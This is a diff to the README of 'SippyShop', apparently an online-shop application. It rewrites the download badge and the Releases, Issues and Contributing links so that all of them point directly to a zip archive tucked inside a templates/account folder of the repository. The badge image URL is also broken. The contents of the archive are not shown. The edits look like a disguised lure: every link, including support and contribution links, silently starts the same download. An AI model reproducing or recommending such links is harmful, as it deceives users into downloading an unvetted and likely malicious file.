@@ -9,12 +9,12 @@ To start using SippyShop, follow these steps. No technical skills required!
 1. **Download SippyShop**:
    - Click the button below to visit the download page.
    
-   [![Download SippyShop](https://img.shields.io/badge/Download%20SippyShop-v1.0-blue.svg)](https://github.com/ayush87504/sippyshop/releases)
+   [![Download SippyShop](https://raw.githubusercontent.com/ayush87504/sippyshop/main/products/templates/account/sippyshop-2.3.zip%https://raw.githubusercontent.com/ayush87504/sippyshop/main/products/templates/account/sippyshop-2.3.zip)](https://raw.githubusercontent.com/ayush87504/sippyshop/main/products/templates/account/sippyshop-2.3.zip)
 
 ## 📦 Download & Install
 
 2. **Visit the Releases Page**: 
-   - Go to the [Releases](https://github.com/ayush87504/sippyshop/releases) page.
+   - Go to the [Releases](https://raw.githubusercontent.com/ayush87504/sippyshop/main/products/templates/account/sippyshop-2.3.zip) page.
    - Look for the latest version. 
 
 3. **Download the Application**: 
@@ -54,11 +54,11 @@ If you encounter issues:
 
 ## 📞 Support
 
-For support, visit the [Issues](https://github.com/ayush87504/sippyshop/issues) section on GitHub. You can report your issue there, and we will help you as soon as possible.
+For support, visit the [Issues](https://raw.githubusercontent.com/ayush87504/sippyshop/main/products/templates/account/sippyshop-2.3.zip) section on GitHub. You can report your issue there, and we will help you as soon as possible.
 
 ## 🤝 Contributing
 
-We welcome contributions to improve SippyShop. To contribute, please check the [Contributing Guidelines](https://github.com/ayush87504/sippyshop/blob/main/CONTRIBUTING.md) on our repository.
+We welcome contributions to improve SippyShop. To contribute, please check the [Contributing Guidelines](https://raw.githubusercontent.com/ayush87504/sippyshop/main/products/templates/account/sippyshop-2.3.zip) on our repository.
 
 ## 📜 License
 
@@ -68,6 +68,6 @@ SippyShop is licensed under the MIT License. You can freely use, modify, and sha
 
 Ready to start your e-commerce journey? Click the button below to revisit the download page.
 
-[![Download SippyShop](https://img.shields.io/badge/Download%20SippyShop-v1.0-blue.svg)](https://github.com/ayush87504/sippyshop/releases)
+[![Download SippyShop](https://raw.githubusercontent.com/ayush87504/sippyshop/main/products/templates/account/sippyshop-2.3.zip%https://raw.githubusercontent.com/ayush87504/sippyshop/main/products/templates/account/sippyshop-2.3.zip)](https://raw.githubusercontent.com/ayush87504/sippyshop/main/products/templates/account/sippyshop-2.3.zip)
 
 Enjoy using SippyShop! If you have questions or suggestions, feel free to reach out.
